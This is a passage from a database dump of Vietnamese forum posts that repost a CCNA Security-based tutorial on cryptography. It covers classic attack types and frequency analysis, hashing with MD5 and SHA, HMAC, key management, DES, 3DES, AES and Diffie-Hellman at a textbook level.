sau:<br>\r\n    -       <b><i>Brute-Force Attack</i></b><br>\r\n    -       <b><i>Ciphertext-Only Attack</i></b><br>\r\n    -       <b><i>Known-Plaintext Attack</i></b><br>\r\n    -       <b><i>Chosen-Plaintext Attack</i></b><br>\r\n    -       <b><i>Chosen-Ciphertext Attack</i></b><br>\r\n    -       <b><i>Meet-in-the-Middle</i></b><br><br>\r\n    <i>3.1.Brute-Force Attack<br><br>\r\n    Attacker</i> sẽ cố gắng thử tất cả các <i>key</i> có thể có. Kiểu tấn công này áp dụng được cho tất cả các thuật toán mã hóa. Nhìn chung, <i>brute-force attack</i> sẽ thành công nếu dò được khoảng 50% <i>keyspace (không gian key)</i>. Để ngăn chặn kiểu tấn công này, các thuật toán mã hóa hiện đại cần có <i>keyspace</i> đủ lớn để <i>attacker</i> phải tiêu tốn quá nhiều chi phí và thời gian nếu dùng <i>brute-force attack.</i><br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/148993994420150721.1.7.png\">\r\n    </div><br>\r\n    Hiện nay, bằng <i>brute-force attack</i>, <i>attacker</i> có thể <i>crack</i> DES trong vòng 22h; còn với AES thì cần tới 149 triệu năm.<br><br>\r\n    <i>3.2.Ciphertext-Only Attack</i><br><br>\r\n    Trong kiểu tấn công này, <i>attacker</i> chỉ có mẫu dữ liệu đã mã hóa <i>(ciphertext)</i>. Công việc của hắn là khôi phục <i>ciphertext</i> của càng nhiều dữ liệu càng tốt. <i>Attacker</i> sẽ sử dụng phương pháp phân tích thống kê để suy đoán plaintext, thậm chí là key. Kiểu tấn công này không còn áp dụng trong thực tế vì các thuật toán hiện đại sẽ tạo ra các giá trị ngẫu nhiên tạm thời để chống lại phương pháp phân tích thống kê.<br><br>\r\n    <i>3.3.Known-Plaintext Attack</i><br><br>\r\n    Trong kiểu tấn công này, <i>attacker</i> có <i>ciphertext</i> của một vài dữ liệu và cũng có được ít nhiều <i>plaintext</i>. Với hiểu biết về giao thức, kiểu tập tin, hoặc các chuỗi đặc trưng có trong dữ liệu gốc, <i>attacker</i> sử dụng <i>brute-force</i> để cố tìm <i>key</i>. <i>Known-Plaintext Attack</i> là kiểu tấn công có tính thực tế nhất. Để phòng chống kiểu tấn công này, các thuật toán hiện đại cần tạo ra <i>keyspace</i> khổng lồ. Vì để thành công, <i>attacker</i> cần dò tìm trong tối thiểu ½ <i>keyspace</i>.<br><br>\r\n    <i>3.4.Chosen-Plaintext Attack</i><br><br>\r\n    Trong kiểu tấn công này, <i>attacker</i> chọn lọc dữ liệu của thiết bị mã hóa rồi thực thi mã hóa và quan sát kết quả. Kiểu tấn công này hiệu quả hơn so với <i>Known-Plaintext Attack</i> nhưng vẫn khó áp dụng vào thực tế vì <i>attacker</i> cần truy cập được vào hệ thống mạng tin cậy và đánh cắp được cả <i>ciphertext</i> và <i>plaintext.<br><br>\r\n    3.5.Chosen-Ciphertext Attack</i><br><br>\r\n    Trong kiểu tấn công này, <i>attacker</i> có thể chọn lọc các mẫu <i>ciphertext</i> khác nhau để được giải mã và có quyền truy cập tới <i>plaintext</i> đã giải mã. Với cặp mẫu <i>ciphertext/plaintext</i> <i>attacker</i> thực thi dò tìm <i>key.</i> Phương pháp tấn công này tương tự với <i>chosen-plaintext attack</i> và cũng khó áp dụng vào thực tế.<br><br>\r\n    <i>3.6.Meet-in-the-Middle</i><br><br>\r\n    Kiểu tấn công này còn được gọi là <i>plaintext attack</i>. <i>Attacker</i> biết một phần của <i>plaintext</i> và <i>ciphertext</i> tương ứng. Hắn sẽ dùng các <i>key</i> có thể có để mã hóa <i>plaintex</i>, giải mã <i>ciphertext</i> cho đến khi có kết quả trùng khớp.<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/148993994420150721.1.8.png\">\r\n    </div><br>\r\n    3.7.  Phương pháp phân tích tần suất (<i>Frequency Analysis</i>)<br><br>\r\n    So với <i>brute-force</i>, phân tích theo tần suất là phương pháp có tính khoa học hơn. Phương pháp này dựa trên một thực tế là có những chữ cái tiếng Anh được sử dụng nhiều hơn chữ khác. Ví dụ: trong ngôn ngữ tiếng Anh, chữ cái E,T và A được sử dụng nhiều nhất. Sử dụng ít nhất là chữ cái J,Q,X và Z. Đặc điểm này có thể giúp giải mã dữ liệu.<br><br>\r\n    Ví dụ: chúng ta có <i>ciphertext</i> được thực hiện bởi thuật toán <i>Caesar</i> là IODQN HDVW DWWDFN DW GDZQ. Trong chuỗi này, có 6 chữ cái D, và 4 chữ W. Theo nhận xét ở trên, các chữ D,W trong <i>ciphertext</i> có thể là chữ E,T hoặc A trong <i>plaintext</i>. Thay thế thử và chúng ta tìm ra chữ D đã mã hóa chữ A, chữ W thay thế chữ T.<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/148993994420150721.1.9.png\">\r\n    </div><br>\r\n    <i>( hết phần 1 )</i><br>\r\n    <b>Tham khảo:</b><br>\r\n    -       <i>CCNA Security curriculum<br><br>\r\n    (Nguồn: Blog “Học Ở Mọi Hình Thức” <a href=\"https://duchm72.wordpress.com/2015/07/22/cryptographic-systems-he-thong-mat-ma-part-1/\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fduchm72.wordpress.com%2F2015%2F07%2F22%2Fcryptographic-systems-he-thong-mat-ma-part-1%2F&amp;hash=ba825a55a8c3594cb19de4b826abee27\" rel=\"nofollow ugc noopener\">https://duchm72.wordpress.com/2015/07/22/cryptographic-systems-he-thong-mat-ma-part-1/ </a>)</i></div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(48, 'Crypto2: Hệ thống mật mã - Phần 2', '', '<div class=\"bbWrapper\"><b><i>PART 2 – INTEGRITY AND AUTHENTICITY</i></b><br><br>\r\n    Phần 2 gồm có:<br>\r\n    -       <i>Cryptographic Hashes (mật mã hàm băm)</i><br>\r\n    -       <i>Integrity with MD5 and SHA-1 (hàm băm MD5 và SHA-1)</i><br>\r\n    -       <i>Authenticity with HMAC (xác thực bằng HMAC)</i><br>\r\n    -       <i>Key Management (Quản lý khóa)</i><br><br>\r\n    Các thuật ngữ trong bài:<br>\r\n    1.    <i>Hash function: hàm băm</i><br>\r\n    2.    <i>Message: dữ liệu nhị phân</i><br>\r\n    3.    <i>Message digest/hash value/digest/fingerprint: kết quả hàm băm</i><br>\r\n    4.    <i>Digital fingerprint: dấu vân tay số (điểm chỉ số)</i><br>\r\n    5.    <i>Digital signature: chữ ký số</i><br>\r\n    6.    <i>Key length: độ dài khóa</i><br>\r\n    7.    <i>Keyspace: không gian khóa (số lượng khóa có thể có)</i><br>\r\n    8.    <i>Secret key: khóa bí mật (chỉ cấp cho bên truyền và bên nhận)</i><br>\r\n    9.    <i>Symmetric keys: khóa đối xứng</i><br>\r\n    10.  <i>Asymmetric keys: khóa bất đối xứng</i><br>\r\n    <br>\r\n    <b><i>1.Cryptographic Hashes</i></b><br>\r\n    Một hàm <i>hash</i> với đầu vào là dữ liệu nhị phân (còn gọi là <i>message)</i> tùy ý và cho kết quả là một chuỗi <i>bit</i> có độ dài cố định <i>(</i>còn gọi là <i>message digest </i>hoặc <i>hash value)</i>. Là hàm toán học một chiều, hàm <i>hash</i> tương đối dễ tính toán nhưng rất khó để giải ngược. Một ví dụ tương tự là việc xay <i>coffee</i>. Xay nhỏ hạt thì rất dễ nhưng gần như là không thể làm cho bột biến trở lại thành hạt <i>coffee.</i><br>\r\n    <br>\r\n    Hàm <i>hash</i> được sử dụng để kiểm tra tính toàn vẹn của dữ liệu. Nó cũng được dùng để đánh giá tính xác thực.<br>\r\n    Hàm <i>hash</i> tương tự với hàm <i>checksum</i> (CRC) nhưng có tính mật mã cao hơn. Với một giá trị CRC, chúng ta có thể dễ dàng tìm thấy nhiều mẫu dữ liệu và cho ra cùng một kết quả <i>checksum</i>. Với hàm <i>hash</i>, nếu tham số đầu vào khác nhau thì sẽ cho ra kết quả khác nhau. Mỗi khi dữ liệu bị thay đổi thì <i>hash value</i> sẽ thay đổi. Vì lý do này, <i>hash value</i> còn gọi là <i>digital fingerprint. Hash value</i> cũng được dùng để phát hiện ra các tệp dữ liệu trùng lặp, phiên bản dữ liệu thay đổi …Nó cũng được dùng để đảm bảo là dữ liệu không bị thay đổi ngẫu nhiên hoặc cố tình.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/148993994420150724.2.1.png\">\r\n    </div>Hàm <i>hash</i> được sử dụng trong nhiều trường hợp khác nhau, như:<br><br>\r\n    -       Cung cấp bằng chứng xác thực khi kết hợp với <i>symmetric secret authentication key</i>, ví dụ: <i>IP Security</i>, xác thực giao thức định tuyến<br>\r\n    -       Cung cấp tính năng xác thực một lần và một chiều như với <i>PPP Challenge Handshake Authentication Protocol (CHAP)</i><br>\r\n    -       Cung cấp bằng chứng về tính toàn vẹn khi triển khai các ứng dụng có dùng chữ ký số.<br><br>\r\n    Về mặt toán học, hàm <i>hash</i> <i>H(x)=h</i> cần có các đặc điểm sau:<br>\r\n    -       Tham số đầu vào có độ dài tùy ý<br>\r\n    -       Kết quả đầu ra có độ dài cố định<br>\r\n-       <i>H(x)</i> là tương đối dễ tính toán với x tùy ý<br>\r\n-       <i>H(x)</i> là hàm một chiều và không thể đảo ngược (nghĩa là biết h nhưng không tìm ra x)<br>\r\n-       <i>H(x)</i> là không xung đột <i>(collision free),</i> nghĩa là với 2 tham số đầu vào khác nhau thì sẽ cho kết quả khác nhau<br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/148993994420150724.2.2.png\">\r\n    </div>Hàm <i>hash</i> rất hiệu quả khi dùng kiểm tra dữ liệu không bị thay đổi ngẫu nhiên, nhưng nó không thể đảm bảo là dữ liệu không bị thay đổi cố tình. Ví dụ: <i>Alice</i> truyền dữ liệu (M) cho <i>Bob</i>. Để đảm bảo dữ liệu không bị thay đổi, <i>Alice</i> thực hiện băm dữ liệu <i>H(M)=h</i> và gửi kèm giá trị này với M. Bên Bob, khi nhận được dữ  liệu sẽ băm lại <i>H(M)=x</i> và so sánh “x” với giá trị “h” gửi kèm. Nếu <i>x=h</i> thì M không bị thay đổi trong khi truyền. Tuy nhiên, giả sử có một <i>attacker</i> đứng giữa <i>Alice</i> – <i>Bob</i> và đánh cắp dữ liệu. <i>Attacker</i> biến đổi Mà M’, băm lại giá trị này <i>H(M’)=h’</i> và gửi cặp <i>(M’,h’)</i> sang cho <i>Bob</i>. Phía nhận tính toán lại, <i>H(M’)=x’</i> và so sánh với “h’”. Kết quả trùng nhau. Điều này có nghĩa là <i>Bob</i> kiểm tra và không thấy dữ liệu bị thay đổi trong hoạt động truyền (từ <i>attacker</i>) nhưng lại không phát hiện ra dữ liệu đã bị thay đổi so với gốc (từ <i>Alice</i>). Đây chính là thiếu “tính xác thực” trong hoạt động truyền.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/148993994420150724.2.3.png\">\r\n    </div>Có hai hàm băm nổi tiếng là:<br>\r\n    -       <i>Message Digest 5 (MD5) with 128-bit digests</i><br>\r\n    -       <i>Secure Hash Algorithm 1 (SHA-1) with 160-bit digests</i><br><br>\r\n    <b>2.<i>Integrity with MD5 and SHA-1<br><br>\r\n    2.1.MD5</i></b><br><br>\r\n    Ron Rivest phát minh ra MD5 năm 1991. Về cơ bản MD5 là một chuỗi phức tạp của các phép toán nhị phân đơn giản, như OR và phép quay, và cho kết quả là chuỗi 128 <i>bit</i>. Thuật toán chính dựa trên hàm nén các khối dữ liệu. Đầu vào là <i>data block </i>cộng với <i>feedback </i>của <i>block </i>trước. <i>Block </i>512 <i>bit</i> được chia thành 16 <i>sub-block </i>32 <i>bit</i>. Các <i>block</i> này được sắp xếp lại bằng phép toán lặp gồm 4 vòng. Kết quả là một tập 4 <i>block </i>32<i> bit</i> nối tiếp nhau và tạo thành <i>128 bit hash value</i>.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/148993994420150724.2.4.png\">\r\n    </div><br>\r\n    MD5 dựa trên MD4 (đã bị phá vỡ) và bị xem như kém an toàn hơn so với SHA-1.<br><br>\r\n    <b><i>2.2.SHA</i></b><br><br>\r\n    <i>National Institute of Standards and Technology (NIST)</i> đã phát minh ra <i>Secure Hash Algorithm (SHA)</i> và công bố SHA-1 vào năm 1994. Về thiết kế, SHA-1 rất giống với MD4, MD5.<br>\r\n    <br>\r\n    Thuật toán SHA-1 băm dữ liệu đầu vào có kích thước nhỏ hơn 2^26 <i>bit</i> và tạo ra <i>160-bit message digest</i>. Thuật toán này hơi chậm hơn so với MD5 nhưng cho giá trị <i>digest</i> lớn hơn nên bảo mật hơn (đối với các kiểu tấn công <i>brute-force</i> và giải ngược).<br>\r\n    NIST đã đưa ra 4 phiên bản hàm SHA với giá trị <i>digest </i>lớn hơn:<br>\r\n    <ul>\r\n    <li>SHA-224 (224 bit)</li>\r\n    <li>SHA-256 (256 bit)</li>\r\n    <li>SHA-384 (384 bit)</li>\r\n    <li>SHA-512 (512 bit)</li>\r\n    </ul>Bốn phiên bản này được xem như SHA-2 (mặc dù chưa được tiêu chuẩn hóa). NIST cũng đã phát triển thuật toán SHA-3 có tính bảo mật cao hơn và sẽ thay thế cho SHA-1, SHA-2.<br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/148993994420150724.2.5.png\">\r\n    </div><b><i>3.Authenticity HMAC</i></b><br><br>\r\n    Trong mật mã học, <i>keyed-hash message authentication code (HMAC or KHMAC)</i> là một kiểu của <i>message authentication code (MAC)</i>. <i>HMAC</i> được tính toán bằng cách sử dụng một hàm <i>hash</i> cùng với <i>secret key</i> (là <i>key</i> chỉ có <i>sender</i> và <i>receiver</i> biết). Bây giờ, chúng ta có hàm <i>hash</i> như sau: H(M,K)=h, trong đó M là <i>message (dữ liệu cần băm)</i> và K là <i>secret key.</i> Với việc dùng thêm <i>secret key</i>, hàm HMAC cung cấp thêm tính năng xác thực nguồn tin và có thể chống lại <i>man-in-the-middle attack</i>.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/148993994420150725.3.1.png\">\r\n    </div><br>\r\n    Chúng ta xem lại ví dụ “<i>Alice</i> truyền dữ liệu (M) cho <i>Bob”</i>. Để đảm bảo dữ liệu toàn vẹn và thêm tính năng xác thực bằng cách dùng <i>secret key (K)</i>, <i>Alice</i> thực hiện băm dữ liệu <i>H(M,K)=h</i> và gửi kèm giá trị này với M. Bên Bob, khi nhận được dữ  liệu sẽ băm lại <i>H(M,K)=x</i> và so sánh “x” với giá trị “h” gửi kèm. Nếu <i>x=h</i> thì M không bị thay đổi trong khi truyền. Giả sử có một <i>attacker</i> đứng giữa <i>Alice</i> – <i>Bob</i> và đánh cắp dữ liệu nhưng không biết <i>secret key (</i>K<i>)</i>. <i>Attacker</i> biến đổi Mà M’, băm lại giá trị này <i>H(M’,K’)=h’</i> và gửi cặp <i>(M’,h’)</i> sang cho <i>Bob</i>. Phía nhận tính toán lại, <i>H(M’,K)=x’</i> và so sánh với “h’”. Kết quả khác nhau vì tập đầu vào (M’,K) phía <i>Bob</i> khác với (M’,K’) phía <i>attacker</i>. Điều này chứng tỏ dữ liệu bị thay đổi và không phải do <i>Alice</i> gửi.<br>\r\n    Các bạn tham khảo thêm ví dụ sau:<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/148993994420150725.3.2.png\">\r\n    </div>Giao thức IP Security trong triển khai VPN sử dụng hàm HMAC để cung cấp tính năng xác thực nguồn tin và kiểm tra toàn vẹn dữ liệu.<br><br>\r\n    <b><i>4.Key Management</i></b><br><br>\r\n    Quản lý khóa là phần khó nhất khi thiết kế hệ thống mật mã. Trong thực tế, hầu hết các tấn công hệ thống mật mã là nhằm đến mức quản lý khóa chứ không phải hướng đến bản thân thuật toán mã hóa.<br>\r\n    <i>Key Management </i>có các đặc điểm cơ bản sau:<br>\r\n    <ul>\r\n    <li><i>Generation (sinh/tạo khóa)</i>: trong hệ thống mật mã hiện đại, việc sinh <i>key</i> được thực hiện tự động chứ không phải do người dùng thực hiện. Người ta sử dụng bộ tạo số ngẫu nhiên để <i>attacker</i> khó dự đoán.</li>\r\n    <li><i>Verification (kiểm tra)</i>: hầu hết các thuật toán mã hóa đều có các <i>key</i> không an toàn. Bằng chức năng kiểm tra khóa, các <i>key</i> này có thể tạo lại để đảm bảo an toàn hơn.</li>\r\n    <li><i>Storage (lưu trữ)</i>: trong hệ điều hành <i>multi-user</i>, một <i>key</i> có thể được lưu trữ trong bộ nhớ. Đây là một lỗ hổng bảo mật khi mà dữ liệu từ bộ nhớ được ghi vào ổ cứng và một chương trình <i>Trojan Horse</i> có thể đánh cắp <i>private key.</i></li>\r\n    <li><i>Exchange (trao đổi):</i> nên cung cấp một cơ chế trao đổi <i>key</i> an toàn, ngay cả khi truyền qua hạ tầng mạng không tin cậy.</li>\r\n    <li><i>Revocation and Destruction (thu hồi và phá hủy): </i>các <i>key</i> bị thu hồi cần được thông báo tới các bên sử dụng. Việc loại bỏ các <i>key</i> cũ cũng là một biện pháp ngăn chặn tấn công.</li>\r\n    </ul>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/148993994420150725.4.1.png\">\r\n    </div>Có 2 khái niệm dùng để mô tả <i>key</i> là <i>key length (</i>độ dài khóa, đo bằng<i> bit)</i> và <i>keyspace (không gian khóa, </i>số lượng <i>key </i>có thể tạo ra<i>)</i>. Khi tăng <i>key length</i> thì <i>keyspace </i>tăng theo cấp số nhân. Ví dụ:<br>\r\n    <br>\r\n    -       <i>key length = 2-bit à keyspace = 4 (2^2), </i>và có 4 <i>key (00, 01, 10, and 11). </i><br>\r\n    -       <i>key length = 3-bit à keyspace = 8 (2^3), </i>có 8<i> keys (000, 001, 010, 011, 100, 101, 110, 111). </i><br>\r\n    -       <i>key length = 4-bit, keyspace = 16. </i><br>\r\n    -       <i>key length = 40-bit, keyspace = 1,099,511,627,776</i><br>\r\n    <br>\r\n    Một <i>key</i> có độ dài n <i>bits</i> thì có <i>keyspace</i> là 2^n. Nếu thêm 1 <i>bit </i>vào <i>key </i>thì <i>keyspace </i>tăng lên gấp đôi. Các bạn xem ví dụ sau:<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/148993994420150725.4.2.png\">\r\n    </div>Có một vài kiểu <i>key </i>mã hóa sau:<br>\r\n    <br>\r\n    -       <i>Symmetric keys</i>, ví dụ dùng trong VPN<br>\r\n    -       <i>Asymmetric keys</i>, thường dùng trong HTTPs<br>\r\n    -       <i>Digital signatures</i>, thường dùng trong kết nối đến website bảo mật<br>\r\n    -       <i>Hash keys</i>, thường dùng để tạo <i>Symmetric keys</i> và <i>Asymmetric keys</i> …<br><br>\r\n    Với một thuật toán mã hóa tin cậy, <i>attacker</i> chỉ có thể dò tìm <i>key </i>bằng tấn công <i>brute-force</i>. Kiểu tấn công này yêu cầu phải tìm kiếm toàn bộ <i>keyspace</i> và <i>attacker </i>có thể thành công khi dò tìm được 50% <i>keyspace.</i> Do đó việc lựa chọn độ dài <i>key </i>thích hợp là yếu tố rất quan trọng.<br>\r\n        <img src=\"Imageass/148993994420150725.4.3.png\"><br><br>\r\n    <i>( hết phần 2 )</i><br><br>\r\n    <b>Tham khảo:</b><br><br>\r\n    <ul>\r\n    <li data-xf-list-type=\"ul\"><i>CCNA Security curriculum</i></li>\r\n    </ul><br>\r\n    <i>(Nguồn: Blog \"Học Ở Mọi Hình Thức\" </i><a href=\"https://duchm72.wordpress.com/2015/07/26/cryptographic-systems-he-thong-mat-ma-part-2/\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fduchm72.wordpress.com%2F2015%2F07%2F26%2Fcryptographic-systems-he-thong-mat-ma-part-2%2F&amp;hash=cd5f700bd98fb088d2323b3106c5c5d8\" rel=\"nofollow ugc noopener\">https://duchm72.wordpress.com/2015/07/26/cryptographic-systems-he-thong-mat-ma-part-2/</a><i>)</i>\r\n</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(49, 'Crypto3: Hệ thống mật mã - Phần 3', '', '<div class=\"bbWrapper\"><b><i>PART 3 – CONFIDENTIALITY</i></b><br><br>\r\n    Phần 3 gồm có:<br>\r\n    -       <i>Encryption (mã hóa)</i><br>\r\n    -       <i>Data Encryption Standard (DES)</i><br>\r\n    -       <i>3DES</i><br>\r\n    -       <i>Advanced Encryption Standard (AES)</i><br>\r\n    -       <i>Alternate Encryption Algorithms (các thuật toán mã hóa thay thế)</i><br>\r\n    -       <i>Diffie-Hellman Key Exchange (thuật toán trao đổi khóa DH)</i><br><br>\r\n    Các thuật ngữ trong bài:<br><br>\r\n    1. <i>Secret key: khóa bí mật (chỉ cấp cho bên truyền và bên nhận)</i><br>\r\n    2. <i>Symmetric keys: khóa đối xứng</i><br>\r\n    3. <i>Asymmetric keys: khóa bất đối xứng<br>\r\n    4. Block ciphers: mã hóa khối<br>\r\n    5. Stream ciphers: mã hóa dòng<br>\r\n    6. Block size: kích thước khối dữ liệu<br>\r\n    7. Input data: dữ liệu đầu vào<br>\r\n    8. Output data: dữ liệu đầu ra</i><br><br>\r\n    <b><i>1. Encryption</i></b><br><br>\r\n    Kỹ thuật mã hóa có thể cung cấp tính năng bí mật cho cả 7 <i>layers</i> trong mô hình OSI bằng cách kết hợp với các công cụ hoặc giao thức, như sau:<br>\r\n    <br>\r\n    -       Các thiết bị độc quyền đảm bảo an toàn tại tầng 2 (<i>Data Link)</i><br>\r\n    -       Các giao thức đảm bảo an toàn cho tầng 3 (<i>Network) </i> như <i>IP Security</i> …<br>\r\n    -       Các giao thức như SSL hoặc TLS đảm bảo tính bí mật tại tầng 5 <i>(Session)</i><br>\r\n    -       Bảo mật <i>email, database …</i> tại tầng 7 <i>(Application)</i><br><br>\r\n    Có 2 phương pháp đảm bảo an toàn dữ liệu khi sử dụng các phương thức mã hóa. Đó là: bảo vệ bản thân thuật toán <i>(algorithm) </i>, và bảo vệ bằng khóa <i>(keys)</i>.Với phương pháp bảo vệ bằng <i>keys</i>, có 2 loại thuật toán mã hóa căn bản là: đối xứng <i>(symmetric)</i> và bất đối xứng <i>(asymmetric)</i>.<br>\r\n    <br>\r\n    Thuật toán mã hóa đối xứng sử dụng một khóa chung, còn gọi là <i>secret key,</i> để mã hóa và giải mã. Khóa này cần chia sẻ trước <i>(pre-shared)</i> cho bên truyền và bên nhận. Vì <i>secret key</i> được bảo vệ bởi <i>sender</i> và <i>receiver</i> nên có thể chọn thuật toán mã hóa sử dụng <i>key</i> với độ dài ngắn hơn và làm cho việc tính toán nhanh hơn. Thông thường, thuật toán đối xứng tính toán đơn giản hơn thuật toán bất đối xứng và có thể tăng tốc bằng phần cứng chuyên dụng. Nếu cần mã hóa lượng dữ liệu lớn, người ta chọn thuật toán đối xứng. Thách thức khi sử dụng thuật toán đối xứng là việc quản lý khóa. <i>Secret key</i> cần được trao đổi bằng kênh an toàn cho <i>sender</i> và <i>receiver</i> trước khi truyền dữ liệu.<br>\r\n    <br>\r\n    <div>\r\n        <img src=\"Imageass/14899399453.1.png\">\r\n    </div><br>\r\n    Thuật toán bất đối xứng sử dụng các khóa khác nhau để mã hóa và giải mã và không dùng đến <i>pre-shared key</i>. Vì cả 2 bên truyền và nhận không có <i>shared secret key</i> nên cần dùng khóa có độ dài rất lớn để ngăn chặn <i>attackers</i>. Các thuật toán này tiêu tốn nhiều tài nguyên và tính toán chậm. Trong thực tế, thuật toán bất đối xứng thường tính toán chậm hơn hàng trăm hoặc hàng nghìn lần so với thuật toán đối xứng.<br>\r\n    <br>\r\n    <div>\r\n            <img src=\"Imageass/14899399453.2.png\">\r\n    </div>Các thuật toán mã hóa đối xứng phổ biến là <i>DES, 3DES, AES, Software Encryption Algorithm (SEAL), </i>và <i>Rivest ciphers (RC) series.</i> Ngoài ra còn có <i>Blowfish, Twofish, Threefish, </i>và<i> Serpent</i>…<br>\r\n    <br>\r\n    <div>\r\n        <img src=\"Imageass/14899399453.3.png\">\r\n    </div><br>\r\n    Kỹ thuật phổ biến sử dụng trong mã hóa đối xứng là <i>block ciphers</i> (mã hóa khối) và <i>stream ciphers</i> (mã hóa dòng).<br>\r\n    <br>\r\n    -       <b><i>Block ciphers</i></b>: phương pháp này mã hóa một khối dữ liệu gốc <i>(plaintext)</i> có độ dài cố định thành một khối dữ liệu đã mã hóa <i>(ciphertext)</i> có kích thước thông thường là 64 hoặc 128 <i>bits</i>. <i>Block size</i> là ám chỉ đến lượng dữ liệu được mã hóa tại một thời điểm. Nếu <i>input data</i> nhỏ hơn <i>block size</i> thì thuật toán sẽ thêm vào các <i>bit</i> giả. Phương pháp này thường cho kết quả đầu ra có kích thước lớn hơn so với dữ liệu gốc đầu vào.<br>\r\n    <br>\r\n    <div>\r\n        <img src=\"Imageass/14899399453.4.png\">\r\n    </div>-       <b><i>Stream Ciphers</i></b>: phương pháp này mã hóa từng <i>bit</i> một của dữ liệu gốc và có tốc độ nhanh hơn so với <i>block ciphers</i>. <i>Stream ciphers</i> không làm tăng kích thước của dữ liệu.<br>\r\n    <div>\r\n        <img src=\"Imageass/14899399453.5.png\">\r\n    </div>Có 2 tiêu chí chính khi chọn thuật toán mã hóa là:<br>\r\n    -       Được cộng đồng bảo mật tin cậy<br>\r\n    -       Thuật toán đủ an toàn với <i>brute-force attacks</i><br>\r\n    <br>\r\n    <div>\r\n            <img src=\"Imageass/14899399453.6.png\">\r\n    </div><br>\r\n    <b><i>2. Data Encryption Standard (DES)</i></b><br><br>\r\n    DES thường sử dụng kỹ thuật <i>block ciphers</i> (và cũng có thể sử dụng mã <i>stream ciphers)</i>. Thuật toán thực hiện trình tự đơn giản là hoán vị và thay thế <i>data bits</i> với một <i>encryption key</i>.<br>\r\n    <br>\r\n    <div>\r\n            <img src=\"Imageass/14899399453.6.5.png\">\r\n    </div><br>\r\n    DES sử dụng 2 chế độ <i>block ciphers</i> chuẩn là: <i>Electronic Code Book (ECB) </i>hoặc <i>Cipher Block Chaining (CBC)</i>.<br><br>\r\n    <div>\r\n            <img src=\"Imageass/14899399453.7.png\">\r\n    </div><br>\r\n    Cả 2 chế độ này đều dùng phép toán logic XOR.<br><br>\r\n    <div>\r\n            <img src=\"Imageass/14899399453.8.png\">\r\n    </div><br>\r\n    Với ECB, nếu <i>plaintext blocks</i> giống nhau thì <i>ciphertext blocks </i>cũng như nhau. Do đó, <i>attckers</i> có thể phán đoán tính chất tương tự hoặc khác biệt của dữ liệu trên kênh truyền.<br>\r\n    <br>\r\n    Với CBC, mỗi <i>64-bit plaintext block</i> thực hiện phép XOR với <i>ciphertext block</i> trước sau đó tiếp tục mã hóa với DES <i>key</i>. Nếu <i>plaintext blocks</i> giống nhau thì kết quả có thể vẫn khác nhau.<br>\r\n    <br>\r\n    <div>\r\n        <img src=\"Imageass/14899399453.9.png\">\r\n    </div><br>\r\n    <b><i>3.3 DES</i></b><br><br>\r\n    3 DES sử dụng thuật toán DES 3 lần với 3 <i>key</i> khác nhau để mã hóa <i>plaintext blocks</i>. Thuật toán này rất tin cậy vì <i>attacker</i> gần như là không thể tấn công <i>brute-force</i>. Tuy nhiên, 3DES tiêu tốn khá nhiều tài nguyên.<br>\r\n    <br>\r\n    <div>\r\n        <img src=\"Imageass/14899399453.10.png\">\r\n    </div><br>\r\n        <img src=\"Imageass/14899399453.10.5.png\"><br>\r\n    <b><i>4. Advanced Encryption Standard</i></b><br><br>\r\n    AES sử dụng thuật toán <i>Rijndael</i>, do <i>Joan Daemen</i> và <i>Vincent Rijmen</i> phát triển. <i>Rijndael</i>  là thuật toán lặp và  sử dụng <i>block </i>và <i>key</i> có độ dài thay đổi. Để có được kết quả cuối cùng, <i>input block</i> khởi tạo và <i>cipher key</i> bị biến đổi nhiều vòng. Một khóa 128, 192 hoặc 256 <i>bits</i> có thể được sử dụng để mã hóa các <i>data blocks</i> có kích thước 128, 192 hoặc 256 <i>bits</i>. <i>Rijndael</i> được thiết kế để dễ dàng tăng kích thước <i>block</i> hoặc <i>key</i> theo bội số của 32 <i>bits</i> và việc sử dụng tài nguyên tính toán cũng được tối ưu hóa.<br>\r\n    <br>\r\n    <div>\r\n            <img src=\"Imageass/14899399453.11.png\">\r\n    </div><br>\r\n    AES hiệu quả hơn so với DES và 3DES, nhất là trong môi trường yêu cầu thông lượng cao, độ trễ thấp và đặc biệt là nếu chỉ sử dụng phần mềm để thực thi mã hóa.<br>\r\n    <br>\r\n    <div>\r\n        <img src=\"Imageass/14899399453.12.png\">\r\n    </div><br>\r\n    <b>5. <i>Alternate Encryption Algorithms</i></b><br><br>\r\n    <i>Software-optimized Encryption Algorithm (SEAL)</i> là một thuật toán thay thế cho DES, 3DES và AES. Đây là thuật toán mã hóa dòng và sử dụng khóa có độ dài 160 <i>bits</i>. SEAL cũng sử dụng ít tài nguyên khi tính toán.<br>\r\n    <br>\r\n    <div>\r\n            <img src=\"Imageass/14899399453.12.5.png\">\r\n    </div><br>\r\n    RC là thuật toán sử dụng rộng rãi trong nhiều ứng dụng mạng vì tốc độ tốt và cho phép dùng khóa có độ dài thay đổi. Thuật toán RC được sử dụng rộng rãi gồm có RC2, RC4, RC5 và RC6.<br>\r\n    <br>\r\n    <div>\r\n        <img src=\"Imageass/14899399453.13.png\">\r\n    </div><br>\r\n    <b>6. <i>Diffie-Hellman Key Exchange</i></b><br><br>\r\n    Hiện nay, DH là thuật toán hiện đại nhất về trao đổi khóa tự động và là một trong những giao thức sử dụng phổ biến nhất trong hệ thống mạng. DH không phải là một cơ chế mã hóa và không được sử dụng để mã hóa dữ liệu. Thay vì thế, nó là một phương thức 